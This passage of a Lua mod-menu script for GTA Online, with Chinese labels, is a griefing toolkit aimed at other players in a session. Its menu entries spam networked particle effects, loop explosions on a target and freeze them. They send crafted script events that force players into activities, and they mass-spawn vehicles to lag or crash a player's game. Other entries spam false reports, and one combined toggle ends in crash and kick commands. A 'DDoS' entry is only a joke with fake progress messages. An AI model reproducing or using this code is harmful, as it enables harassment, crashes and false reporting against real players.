        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
            "scr_sum2_hal_rider_death_blue", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
                util.yield()
        end
        else
            menu.trigger_commands("freeze "..players.get_name(pid).." off")
            menu.trigger_commands("confuse "..players.get_name(pid).." off")
        end
	end)

    menu.toggle(blurred_screen, "花屏V7", {""}, "请远离该玩家", function(state)
        huaping_7 = state
        if state then
            menu.trigger_commands("freeze "..players.get_name(pid).." on")
            menu.trigger_commands("confuse "..players.get_name(pid).." on")
            while huaping_7 do
        local player_pos = players.get_position(pid)
        request_ptfx_asset("scr_sum2_hal")
        GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
            "scr_sum2_hal_rider_death_greyblack", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
                util.yield()
        end
        else
            menu.trigger_commands("freeze "..players.get_name(pid).." off")
            menu.trigger_commands("confuse "..players.get_name(pid).." off")
        end
	end)

    menu.toggle(blurred_screen, "花屏V8", {""}, "请远离该玩家", function(state)
        huaping_8 = state
        if state then
            menu.trigger_commands("freeze "..players.get_name(pid).." on")
            menu.trigger_commands("confuse "..players.get_name(pid).." on")
            while huaping_8 do
        local player_pos = players.get_position(pid)
        request_ptfx_asset("scr_sum2_hal")
        GRAPHICS.USE_PARTICLE_FX_ASSET("scr_sum2_hal")
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
            "scr_sum2_hal_rider_death_orange", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
                util.yield()
        end
        else
            menu.trigger_commands("freeze "..players.get_name(pid).." off")
            menu.trigger_commands("confuse "..players.get_name(pid).." off")
        end
	end)

    menu.toggle(blurred_screen, "花屏V9", {""}, "请远离该玩家", function(state)
        huaping_9 = state
        if state then
            menu.trigger_commands("freeze "..players.get_name(pid).." on")
            menu.trigger_commands("confuse "..players.get_name(pid).." on")
            while huaping_9 do
        local player_pos = players.get_position(pid)
        request_ptfx_asset("core")
        GRAPHICS.USE_PARTICLE_FX_ASSET("core")
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
            "ent_sht_oil", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
                util.yield()
        end
        else
            menu.trigger_commands("freeze "..players.get_name(pid).." off")
            menu.trigger_commands("confuse "..players.get_name(pid).." off")
        end
	end)
    
    local YuleArmy = menu.list(jindianegao, "圣诞怪兽军队", {}, "")

    menu.toggle(YuleArmy, "圣诞怪兽", {"toggleyulemonster"}, "可能导致该玩家崩溃", function(on_toggle)
        if players.exists(pid) then
        if on_toggle then
            menu.trigger_commands("yulearmy" .. PLAYER.GET_PLAYER_NAME(pid))
            menu.trigger_commands("toggletppeds" .. PLAYER.GET_PLAYER_NAME(pid))
            menu.trigger_commands("skydivepeds" .. PLAYER.GET_PLAYER_NAME(pid))
        else
            menu.trigger_commands("clearyules" .. PLAYER.GET_PLAYER_NAME(pid))
            menu.trigger_commands("toggletppeds" .. PLAYER.GET_PLAYER_NAME(pid))
            menu.trigger_commands("skydivepeds" .. PLAYER.GET_PLAYER_NAME(pid))
            menu.trigger_commands("superclear")
            end  
        end      
    end)

    menu.click_slider(YuleArmy, "生成圣诞怪兽军队", {"yulearmy"}, "", 1, 48, 48, 1, function(val)
        local player_Yule_army = {}
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(ped, false)
        pos.y = pos.y - 5
        pos.z = pos.z + 1
        local Yule = util.joaat("U_M_M_YuleMonster")
        request_model(Yule)
        for i = 1, val do
        player_Yule_army[i] = entities.create_ped(28, Yule, pos, 0)
        ENTITY.SET_ENTITY_INVINCIBLE(player_Yule_army[i], true)
        PED.SET_BLOCKING_OF_NON_TEMPORARY_EVENTS(player_Yule_army[i], true)
        PED.SET_PED_COMPONENT_VARIATION(player_Yule_army[i], 0, 0, 1, 0)
        TASK.TASK_FOLLOW_TO_OFFSET_OF_ENTITY(player_Yule_army[i], ped, 0, -0.3, 0, 7.0, -1, 10, true)
        WEAPON.GIVE_WEAPON_TO_PED(player_Yule_army[i], util.joaat('WEAPON_CANDYCANE'),  9999, true, true)
        PED.SET_PED_COMBAT_ATTRIBUTES(player_Yule_army[i], 20, true)
        PED.SET_PED_SHOOT_RATE(player_Yule_army[i], 1000)
        util.yield()
        end 
    end)

    menu.action(YuleArmy, "清除圣诞怪兽", {"clearyules"}, "", function()
        for i, ped in ipairs(entities.get_all_peds_as_handles()) do
            if PED.IS_PED_MODEL(ped, util.joaat("U_M_M_YuleMonster")) then
                entities.delete_by_handle(ped)
            end
        end
    end)

    menu.toggle_loop(jindianegao,"模型冻结", {"modelfreeze"}, "使玩家的模型无法移动", function()

        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)

        TASK.CLEAR_PED_TASKS_IMMEDIATELY(player)

    end)

    menu.toggle_loop(jindianegao, "脚本冻结", {}, "", function()
        util.trigger_script_event(1 << pid, {-93722397, pid, 0, 0, 0, 0, 0})
        util.yield(500)
    end)


    menu.toggle_loop(jindianegao, "走路带火", {"footfire"}, "", function()
        local coords = players.get_position(pid)
        FIRE.ADD_EXPLOSION(coords.x, coords.y, coords.z, 38, 0, false, false, 0, false)
        util.yield(65)
    end)


    menu.toggle_loop(jindianegao, "循环喷火", {"flameloop"}, "经典恶搞之一", function(on_click)
        if players.exists(pid) then
            local player_pos = players.get_position(pid)
            FIRE.ADD_EXPLOSION(player_pos.x, player_pos.y, player_pos.z - 1, 12, 1, true, false, 1, false)
            util.yield(5)
        end
    end)



    menu.toggle_loop(jindianegao, "循环喷水", {"waterloop"}, "经典恶搞之一", function(on_click)
        if players.exists(pid) then
            local player_pos = players.get_position(pid)
            FIRE.ADD_EXPLOSION(player_pos.x, player_pos.y, player_pos.z - 1, 13, 1, true, false, 1, false)
            util.yield(5)
        end
    end)



    menu.toggle_loop(jindianegao, "随机循环", {"randomloop"}, "经典恶搞之一", function(on)
        if players.exists(pid) then
        local target_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local coords = ENTITY.GET_ENTITY_COORDS(target_ped)
        FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], math.random(0, 82), 1.0, true, false, 0.0)
        end
    end)



	menu.toggle_loop(jindianegao, "折腾玩家", {"tossplayers"}, "在玩家身上循环无损伤的爆炸", function()
        if players.exists(pid) then
        local playerCoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(pid), true)
        SE_add_explosion(playerCoords['x'], playerCoords['y'], playerCoords['z'], 1, 1, SEisExploAudible, SEisExploInvis, 0, true)
    end
end)	



	menu.toggle_loop(jindianegao, "原子弹轰炸", {"atomicbomb"}, "", function(on_click)
        if players.exists(pid) then
        do
        orbital(pid)
        end
    end

    end)

                   

    menu.toggle_loop(jindianegao,"火箭雨", {'rockets'}, '', function()
        if players.exists(pid) then
        rain_rockets(pid, false)
        util.yield(100)
        end
    end)



    menu.toggle_loop(jindianegao,"循环电击枪", {"stungunloop"}, "在此玩家周围生成电击枪发射音效", function()
        if players.exists(pid) then
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local pos = ENTITY.GET_ENTITY_COORDS(player)
        for i = 1, 50 do
            MISC.SHOOT_SINGLE_BULLET_BETWEEN_COORDS(pos.x, pos.y, pos.z + 1, pos.x, pos.y, pos.z, 0, true, util.joaat("weapon_stungun"), players.user_ped(), false, true, 1.0)
        end
        util.yield(100)
    end
end)

    menu.toggle_loop(jindianegao, "大风车", {"Windmills"}, "", function(on_toggle)
        if players.exists(pid) then
        windmills(pid)
        end
    end)

    menu.toggle_loop(jindianegao,"将玩家推向前方", {"pushplayerforward"}, "", function()
        if players.exists(pid) then
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)

        local pos = ENTITY.GET_ENTITY_COORDS(player, false)

        local glitch_hash = util.joaat("prop_shuttering03")

        request_model(glitch_hash)

        local dumb_object_front = entities.create_object(glitch_hash, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 1, 0))

        local dumb_object_back = entities.create_object(glitch_hash, ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(PLAYER.GET_PLAYER_PED(pid), 0, 0, 0))

        ENTITY.SET_ENTITY_VISIBLE(dumb_object_front, false)

        ENTITY.SET_ENTITY_VISIBLE(dumb_object_back, false)

        util.yield()

        entities.delete_by_handle(dumb_object_front)

        entities.delete_by_handle(dumb_object_back)

        util.yield() 
        end

    end)



    local glitchForcefield = false

    local glitchforcefield_toggle

    glitchforcefield_toggle = menu.toggle(jindianegao, "范围删除", {}, "启用后会将此玩家附近的模型删除", function(toggled)
        if players.exists(pid) then

        glitchForcefield = toggled

        local glitch_hash = util.joaat("p_spinning_anus_s")

        request_model(glitch_hash)



        while glitchForcefield do

            local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)

            local playerpos = ENTITY.GET_ENTITY_COORDS(player, false)

            

            if PED.IS_PED_IN_ANY_VEHICLE(player, true) then

                notification("玩家在载具中. :/")

                menu.set_value(glitchforcefield_toggle, false);

            break end

            

            local stupid_object = entities.create_object(glitch_hash, playerpos)

            ENTITY.SET_ENTITY_VISIBLE(stupid_object, false)

            ENTITY.SET_ENTITY_INVINCIBLE(stupid_object, true)

            ENTITY.SET_ENTITY_COLLISION(stupid_object, true, true)

            util.yield()

            entities.delete_by_handle(stupid_object)

            util.yield()    

        end
    end
end)



	menu.toggle_loop(jindianegao,"循环举报", {"reportloop"}, "会变卡", function()
        if players.exists(pid) then
			if pid ~= players.user() then
				menu.trigger_commands("reportvcannoying " .. PLAYER.GET_PLAYER_NAME(pid))

				menu.trigger_commands("reportvchate " .. PLAYER.GET_PLAYER_NAME(pid))

				menu.trigger_commands("reportannoying " .. PLAYER.GET_PLAYER_NAME(pid))

				menu.trigger_commands("reporthate " .. PLAYER.GET_PLAYER_NAME(pid))

				menu.trigger_commands("reportexploits " .. PLAYER.GET_PLAYER_NAME(pid))

				menu.trigger_commands("reportbugabuse " .. PLAYER.GET_PLAYER_NAME(pid))
            end
        end
	end)

    menu.toggle(jindianegao, "撒尿", {"peeloop"}, "随地大小便应该遭到谴责", function(state)
        if players.exists(pid) then

        if state then 

            local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)

            local bone_index = PED.GET_PED_BONE_INDEX(player_ped, 0x2e28)

            request_ptfx_asset("core")

            GRAPHICS.USE_PARTICLE_FX_ASSET("core")

            ptfx_id = GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE(

                "ent_amb_peeing", player_ped, 0, 0, 0, -90, 0, 0, bone_index, 2, false, false, false

            ) 

        else

            GRAPHICS.STOP_PARTICLE_FX_LOOPED(ptfx_id, false)

        end
    end

    end)

    menu.toggle_loop(jindianegao, "烟雾掉帧", {""}, "", function()
        if players.exists(pid) then
            smoke(pid)
        end
    end)

    menu.toggle_loop(jindianegao, "附近Peds跳伞", {"skydivepeds"}, "", function()
        if players.exists(pid) then
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local c = ENTITY.GET_ENTITY_COORDS(p)
                all_peds = entities.get_all_peds_as_handles()
                player_ped = PLAYER.PLAYER_PED_ID()
                for k,ped in pairs(all_peds) do
                    if not PED.IS_PED_A_PLAYER(ped) then
                        TASK.TASK_SKY_DIVE(ped)
                    end
            end
        end
    end, nil, nil, COMMANDPERM_AGGRESSIVE)

    menu.toggle_loop(jindianegao, "外星人爆炸循环", {"ufoloop"}, "模拟外星人入侵", function()
        if players.exists(pid) then
        alien_explosion_loop(pid)
    end
end)

    menu.toggle(jindianegao, "附加到玩家", {"peeloop"}, "", function(on)

        if PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid) == players.user_ped() then 

            notification("傻B,别附加自己")

            return

        end

        if on then

            ENTITY.ATTACH_ENTITY_TO_ENTITY(players.user_ped(), PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid), 0, 0.0, -0.20, 2, 1.0, 1.0,1, true, true, true, false, 0, true)

        else

            ENTITY.DETACH_ENTITY(players.user_ped(), false, false)

        end

    end)

      menu.action(jindianegao, "掉帧", {""}, "", function()

        local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)

		local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)  

        for i = 0, 180 do 

            attachmentveh1 = CreateVehicle(353883353,TargetPlayerPos,0)   

    end

end)



menu.action(jindianegao, "喷射", {"peeloop"}, "", function(state)

        local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)

        local bone_index = PED.GET_PED_BONE_INDEX(player_ped, 0x2e28)

        request_ptfx_asset("core_snow")

        GRAPHICS.USE_PARTICLE_FX_ASSET("core_snow")

        ptfx_id = GRAPHICS.START_NETWORKED_PARTICLE_FX_LOOPED_ON_ENTITY_BONE(

            "cs_mich1_spade_dirt_throw", player_ped, 0, 0, 0, -90, 0, 0, bone_index, 2, false, false, false

        ) 

end)



	menu.action(jindianegao, "核弹", {""}, "", function(on_click)

		local TargetPlayerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)

		local TargetPlayerPos = ENTITY.GET_ENTITY_COORDS(TargetPlayerPed, true)

        local Object_pizza1 = CreateVehicle(1131912276,TargetPlayerPos,0)

        local Object_pizza2 =CreateObject(253279588,TargetPlayerPos)

            TargetPlayerPos.y = TargetPlayerPos.y + 2

            TargetPlayerPos.z = TargetPlayerPos.z + 70 

            ENTITY.SET_ENTITY_ALPHA(Object_pizza1, 255)

            ENTITY.SET_ENTITY_VISIBLE(Object_pizza1, false, 0)

            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(Object_pizza1, TargetPlayerPos.x, TargetPlayerPos.y, TargetPlayerPos.z, false, true, true)

            ENTITY.ATTACH_ENTITY_TO_ENTITY(Object_pizza2,Object_pizza1, 0,  0.0, 0.00, 0.00, 1.0, 1.0,1, true, false, true, false, 0, true)

        util.yield(5000)

        do

	    orbital(pid)

        entities.delete_by_handle(Object_pizza1)

        entities.delete_by_handle(Object_pizza2)

	  end

end)



    menu.action(jindianegao, "外星人爆炸", {"ufo"}, "模拟外星人入侵", function()
        alien_explosion(pid) 
    end)



    menu.action(jindianegao, "公寓邀请", {}, "", function()

        util.trigger_script_event(1 << pid, {3592101251, players.user(), pid, 1, 0, -1, 4, 127, 0, 0, 0}) 

    end)

    menu.action(jindianegao, "随机任务邀请", {}, "", function()

        util.trigger_script_event(1 << pid, {36077543, players.user(), pid, 1, 7}) 

    end)

    menu.action(jindianegao, "佩里科岛(有过场动画)", {"tpcayo"}, "", function()

        util.trigger_script_event(1 << pid, {-3696723088, pid, 0, 0, 0, 0, 0})

    end)

    menu.action(jindianegao, "佩里科岛(无过场动画)", {"tpcayo2"}, "", function()

        util.trigger_script_event(1 << pid, {-369672308, pid,1, 0, 0, 1, 1})

    end)


    menu.action(jindianegao, "强制赌场剧情动画", {""}, "", function()

        util.trigger_script_event(1 << pid, {2139870214, pid, 2, 0, 0, 4, 0})

    end)

    menu.action(jindianegao, "显示新手教程", {}, "", function()
        local int = memory.read_int(memory.script_global(1894573 + 1 + (pid * 608) + 510))
        util.trigger_script_event(1 << pid, {-95341040, players.user(), 20, 0, 0, 48, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, int})
        util.trigger_script_event(1 << pid, {1742713914, players.user(), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    end)

    menu.action(jindianegao, "发送高尔夫", {}, "", function()
        local int = memory.read_int(memory.script_global(1894573 + 1 + (pid * 608) + 510))
        util.trigger_script_event(1 << pid, {-95341040, players.user(), 193, 0, 0, 48, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, int})
        util.trigger_script_event(1 << pid, {1742713914, players.user(), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    end)

    menu.action(jindianegao, "发送飞行学校", {}, "", function()
        local int = memory.read_int(memory.script_global(1894573 + 1 + (pid * 608) + 510))
        util.trigger_script_event(1 << pid, {-95341040, players.user(), 196, 0, 0, 48, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, int})
        util.trigger_script_event(1 << pid, {1742713914, players.user(), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    end)

    menu.action(jindianegao, "发送飞镖游戏", {}, "", function()
        local int = memory.read_int(memory.script_global(1894573 + 1 + (pid * 608) + 510))
        util.trigger_script_event(1 << pid, {-95341040, players.user(), 192, 0, 0, 48, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, int})
        util.trigger_script_event(1 << pid, {1742713914, players.user(), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    end)

    menu.action(jindianegao, "发送竞赛与追逐游戏", {}, "", function()
        local int = memory.read_int(memory.script_global(1894573 + 1 + (pid * 608) + 510))
        util.trigger_script_event(1 << pid, {-95341040, players.user(), 210, 0, 0, 48, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, int})
        util.trigger_script_event(1 << pid, {1742713914, players.user(), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    end)

    menu.action(jindianegao, "发送巫师废墟游戏", {}, "", function()
        local int = memory.read_int(memory.script_global(1894573 + 1 + (pid * 608) + 510))
        util.trigger_script_event(1 << pid, {-95341040, players.user(), 212, 0, 0, 48, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, int})
        util.trigger_script_event(1 << pid, {1742713914, players.user(), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    end)

    menu.action(jindianegao, "发送荒地复仇2游戏", {}, "", function()
        local int = memory.read_int(memory.script_global(1894573 + 1 + (pid * 608) + 510))
        util.trigger_script_event(1 << pid, {-95341040, players.user(), 211, 0, 0, 48, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, int})
        util.trigger_script_event(1 << pid, {1742713914, players.user(), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    end)

    menu.action(jindianegao, "发送太空猴3游戏", {}, "", function()
        local int = memory.read_int(memory.script_global(1894573 + 1 + (pid * 608) + 510))
        util.trigger_script_event(1 << pid, {-95341040, players.user(), 216, 0, 0, 48, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, int})
        util.trigger_script_event(1 << pid, {1742713914, players.user(), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    end)

    menu.action(jindianegao, "发送Qub3D游戏", {}, "", function()
        local int = memory.read_int(memory.script_global(1894573 + 1 + (pid * 608) + 510))
        util.trigger_script_event(1 << pid, {-95341040, players.user(), 217, 0, 0, 48, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, int})
        util.trigger_script_event(1 << pid, {1742713914, players.user(), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    end)

    menu.action(jindianegao, "发送猎头游戏", {}, "", function()
        local int = memory.read_int(memory.script_global(1894573 + 1 + (pid * 608) + 510))
        util.trigger_script_event(1 << pid, {-95341040, players.user(), 218, 0, 0, 48, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, int})
        util.trigger_script_event(1 << pid, {1742713914, players.user(), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    end)

    menu.action(jindianegao, "发送自由模式", {}, "", function()
        local int = memory.read_int(memory.script_global(1894573 + 1 + (pid * 608) + 510))
        util.trigger_script_event(1 << pid, {-95341040, players.user(), 194, 0, 0, 48, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, int})
        util.trigger_script_event(1 << pid, {1742713914, players.user(), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    end)
    
    menu.action(jindianegao, "强制1V1", {}, "迫使他们进入1V1", function()
        local int = memory.read_int(memory.script_global(1894573 + 1 + (pid * 608) + 510))
        util.trigger_script_event(1 << pid, {-95341040, players.user(), 197, 0, 0, 48, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, 0, 0, 0, 0, int})
        util.trigger_script_event(1 << pid, {1742713914, players.user(), 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0})
    end)

    menu.action(jindianegao, "掉猴子", {""}, "", function()
        monkey_drop(pid)
    end)

    menu.action(jindianegao, "掉CXK", {""}, "", function()
        chicken_drop(pid)
    end)



    local friendly = menu.list(playerMain, "友好选项", {}, "")

    menu.toggle_loop(friendly, "传送所有PED给玩家", {"toggletppeds"}, "", function (on_toggle)
            if on_toggle then
                TpAllPeds(pid)
            else
                TpAllPeds(pid)
            end
    end)

    menu.toggle_loop(friendly, "传送所有载具给玩家", {"toggletppedstpvehs"}, "", function (on_toggle)
            if on_toggle then
                TpAllVehs(pid)
            else
                TpAllVehs(pid)
            end
    end)

    menu.toggle_loop(friendly, "传送所有物体给玩家", {"tpobjs"}, "", function (on_toggle)
            if on_toggle then
                TpAllObjects(pid)
            else
                TpAllObjects(pid)
            end
    end)

    menu.toggle_loop(friendly, "传送所有拾取物给玩家", {"tppickups"}, "", function (on_toggle)
            if on_toggle then
                TpAllPickups(pid)
            else
                TpAllPickups(pid)
            end
    end)

    menu.toggle_loop(friendly, "假钱雨", {}, "", function ()
        local targets = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local tar1 = ENTITY.GET_ENTITY_COORDS(targets, true)
        Streamptfx('core')
        GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD( 'ent_brk_banknotes', tar1.x, tar1.y, tar1.z + 1, 0, 0, 0, 3.0, true, true, true)
    end)


    local cpuburn = menu.list(playerMain, "CPU攻击", {}, "")

	fish_options = menu.list(cpuburn, "CPU V1", {}, "")



	menu.divider(fish_options, "炸鱼")

	

    Ptools_PanTable = {}

    Ptools_PanCount = 1

    Ptools_FishPan = 20



    menu.action(fish_options, "炸鱼", {""}, "卡死", function ()

        local targetped = PLAYER.GET_PLAYER_PED(pid)

        local targetcoords = ENTITY.GET_ENTITY_COORDS(targetped)



        local hash = util.joaat("tug")

        STREAMING.REQUEST_MODEL(hash)

        while not STREAMING.HAS_MODEL_LOADED(hash) do util.yield() end



        for i = 1, Ptools_FishPan do

            Ptools_PanTable[Ptools_PanCount] = VEHICLE.CREATE_VEHICLE(hash, targetcoords.x, targetcoords.y, targetcoords.z, 0, true, true, true)

            ----

            local netID = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(Ptools_PanTable[Ptools_PanCount])

            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(Ptools_PanTable[Ptools_PanCount])

            NETWORK.NETWORK_REQUEST_CONTROL_OF_NETWORK_ID(netID)

            NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(netID)

            NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netID, false)

            NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(netID, pid, true)

            ENTITY.SET_ENTITY_AS_MISSION_ENTITY(Ptools_PanTable[Ptools_PanCount], true, false)

            ENTITY.SET_ENTITY_VISIBLE(Ptools_PanTable[Ptools_PanCount], false, 0)

            ----

            if SE_Notifications then

                notification("Spawned with index of " .. Ptools_PanCount)

            end

            Ptools_PanCount = Ptools_PanCount + 1

        end

    end)





    menu.slider(fish_options, "数量", {""}, "鱼的数量1-300", 1, 300, 20, 1, function(value)

        Ptools_FishPan = value

    end)



    menu.action(fish_options, "删除", {""}, "Yep", function ()

        for x = 1, 5, 1 do

            for i = 1, #Ptools_PanTable do

                entities.delete_by_handle(Ptools_PanTable[i])

                util.yield(10)

            end

        end

        --

        Ptools_PanCount = 1

        Ptools_PanTable = {}

        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(util.joaat("tug"))

    end)

	

menu.action(cpuburn,"CPU V2", {}, "CPU v2", function() 

		while not STREAMING.HAS_MODEL_LOADED(447548909) do

			STREAMING.REQUEST_MODEL(447548909)

			util.yield(10)

		end

		local self_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user())

        local OldCoords = ENTITY.GET_ENTITY_COORDS(self_ped) 

		ENTITY.SET_ENTITY_COORDS_NO_OFFSET(self_ped, 24, 7643.5, 19, true, true, true)



		notification("开始干他")

		menu.trigger_commands("anticrashcamera on")

		local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)

		local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)

		spam_amount = 300

		while spam_amount >= 1 do

			entities.create_vehicle(447548909, PlayerPedCoords, 0)

			spam_amount = spam_amount - 1

			util.yield(10)

		end

		notification("干完") 

		menu.trigger_commands("anticrashcamera off")

		util.yield(5000)

		

	end)

    menu.toggle_loop(cpuburn, "CPU V3", {}, "请远离该玩家", function()
		local player_pos = players.get_position(pid)
		request_ptfx_asset("scr_rcbarry2")
		GRAPHICS.USE_PARTICLE_FX_ASSET("scr_rcbarry2")
		GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
            "scr_clown_death", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
		request_ptfx_asset("scr_rcbarry2")
		GRAPHICS.USE_PARTICLE_FX_ASSET("scr_rcbarry2")
		GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
            "scr_exp_clown", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
		request_ptfx_asset("scr_ch_finale")
       GRAPHICS.USE_PARTICLE_FX_ASSET("scr_ch_finale")
		GRAPHICS.START_NETWORKED_PARTICLE_FX_NON_LOOPED_AT_COORD(
			"scr_ch_finale_drill_sparks", player_pos.x, player_pos.y, player_pos.z, 0, 0, 0, 2.5, false, false, false)
        request_ptfx_asset("scr_ch_finale")
        while not STREAMING.HAS_MODEL_LOADED(447548909) do
			STREAMING.REQUEST_MODEL(447548909)
			end
		local player_ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
		local PlayerPedCoords = ENTITY.GET_ENTITY_COORDS(player_ped, true)
		spam_amount = 1000
		while spam_amount >= 2 do
			entities.create_vehicle(447548909, PlayerPedCoords, 0)
			spam_amount = spam_amount - 2
		end
        util.yield(100)
	end)

	

menu.action(cpuburn, "DDoS", {}, "通过向其路由器发送数据包对玩家进行DDoS攻击", function()

    notification("成功发送DDoS攻击到" ..players.get_name(pid))

        local percent = 0

        while percent <= 100 do

            util.yield(100)

            notification(percent.. "% done")

            percent = percent + 1

        end

        util.yield(3000)

        notification("开个玩笑你个笨比")

    end)



    sound_options = menu.list(playerMain, "声音骚扰", {}, "")



	

	menu.toggle_loop(sound_options, "超市他", {"ohfuck"}, "st", function()

		AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "SPAWN", PLAYER.GET_PLAYER_PED(pid), "BARRY_01_SOUNDSET", true, 2)

		AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "External_Explosion", PLAYER.GET_PLAYER_PED(pid), "Methamphetamine_Job_Sounds", true, 1)

	

    end)

	

	menu.toggle_loop(sound_options, "手机按键（自己听得到）", {"ringtones"}, "st", function()

		AUDIO.PLAY_SOUND_FROM_ENTITY(-1, "Menu_Accept", PLAYER.GET_PLAYER_PED(pid), "Phone_SoundSet_Default", true, 2)

    end)

    menu.toggle(playerMain, "BUFF", {"buff"}, "", function(on)
        if on then
            menu.trigger_commands("yulearmy " .. players.get_name(pid).."10")
            menu.trigger_commands("toggleyulemonster " .. players.get_name(pid).." on")
            menu.trigger_commands("windmills " .. players.get_name(pid).." on")
            menu.trigger_commands("randomloop " .. players.get_name(pid).." on")
            menu.trigger_commands("atomicbomb " .. players.get_name(pid).." on")
            menu.trigger_commands("crashxp " .. players.get_name(pid))
            menu.trigger_commands("togglefragv1 " .. players.get_name(pid).." on")
            util.yield(3000)
            menu.trigger_commands("kick " .. players.get_name(pid))
        else
            menu.trigger_commands("toggleyulemonster " .. players.get_name(pid).." off")
